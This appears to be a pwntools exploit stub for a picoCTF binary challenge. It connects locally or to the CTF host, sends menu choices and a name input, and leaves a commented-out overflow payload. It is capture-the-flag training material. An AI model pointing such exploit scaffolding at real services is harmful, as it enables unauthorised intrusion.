
# -- coding: utf-8 --
from pwn import *

context.log_level = 'debug'
# ENV
PORT =  50157
HOST = "saturn.picoctf.net"

# e = context.binary = ELF('./game')
e = context.binary = ELF('./challenge')
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()

# r.sendlineafter(b">",b"100")
# for i in range(66):
i=1
print(i)
r.sendlineafter(b">",b"1")
payload = b"santa"
pause()
r.sendlineafter(b"Enter their name: ",payload)
r.sendafter(b"feed them: ",b"88888888")
# pause()
# payload = p64(0xdeadbeef)+p64(0xdeadc0de)

# r.sendline(payload)

r.interactive()